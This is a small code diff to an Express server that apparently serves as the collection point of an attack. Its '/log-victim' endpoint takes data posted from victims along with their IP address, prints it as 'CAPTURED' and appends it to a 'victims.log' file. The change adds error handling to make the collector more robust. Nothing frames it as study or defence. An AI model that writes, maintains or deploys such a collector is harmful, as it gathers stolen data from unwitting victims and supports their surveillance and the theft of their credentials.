@@ -299,10 +299,11 @@ app.get('/view-image', (req, res) => {
 app.post('/log-victim', express.json(), (req, res) => {
     const payload = req.body;
     const ip = req.ip;
-	 const data = { ...req.body, ip: req.ip, timestamp: new Date().toISOString() };
-    console.log('💀 CAPTURED:', data);  // Force visible log
-    fs.appendFileSync('victims.log', JSON.stringify(data) + '\n');
-    res.status(200).send('OK');
+	try {
+		 const data = { ...req.body, ip: req.ip, timestamp: new Date().toISOString() };
+		console.log('💀 CAPTURED:', data);  // Force visible log
+		fs.appendFileSync('victims.log', JSON.stringify(data) + '\n');
+		res.status(200).send('OK');
 	 } catch (err) {
     if (!res.headersSent) {  // ← guard
       res.status(500).send('Internal error');
